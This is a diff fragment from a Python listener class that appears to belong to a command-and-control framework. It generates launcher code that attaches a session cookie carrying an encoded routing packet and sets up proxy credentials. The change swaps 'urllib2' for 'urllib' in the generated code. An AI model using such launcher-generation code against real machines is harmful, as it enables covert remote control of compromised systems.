@@ -475,7 +475,7 @@ class Listener(object):
                             launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
                             b64RoutingPacket)
                         else:
-                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            launcherBase += "proxy_auth_handler = urllib.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'" + proxy + "','" + username + "','" + password + "');\n"
